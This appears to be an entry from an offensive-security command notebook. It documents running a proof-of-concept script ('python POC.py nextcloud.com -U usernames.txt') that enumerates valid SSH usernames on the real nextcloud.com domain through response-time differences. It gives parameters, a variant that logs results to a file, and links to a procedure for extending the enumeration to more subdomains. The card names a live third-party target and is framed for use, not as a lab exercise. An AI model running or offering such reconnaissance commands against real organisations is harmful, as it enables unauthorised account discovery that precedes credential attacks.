---
id: cmd-005
data: python POC.py nextcloud.com -U usernames.txt
tags:
  - enumeration
  - ssh
type: command
output: >-
  Output showing usernames with response times; identifies non-existing users
  based on low times
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:58.910Z'
verified: false
validated: true
submitted: true
---
# python-poc-py-username-enumeration-nextcloud-com

## Command

```bash
python POC.py nextcloud.com -U usernames.txt
```

## Description

Enumerates usernames on the main nextcloud.com domain using SSH timing discrepancies.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| hostname | Target (nextcloud.com) | Yes |
| -U | List of usernames | Yes |

## Examples

### Basic Usage

```bash
python POC.py nextcloud.com -U usernames.txt
```

### Advanced Usage

```bash
python POC.py nextcloud.com -U usernames.txt >> all_results.txt
```

## Expected Output

Per-username timings; use threshold to distinguish valid accounts.

## Related

- [[commands/python-poc-py-username-enumeration-lists-nextcloud-com]]
- [[procedures/Extend-Enumeration-to-Additional-Nextcloud-Subdomains]]
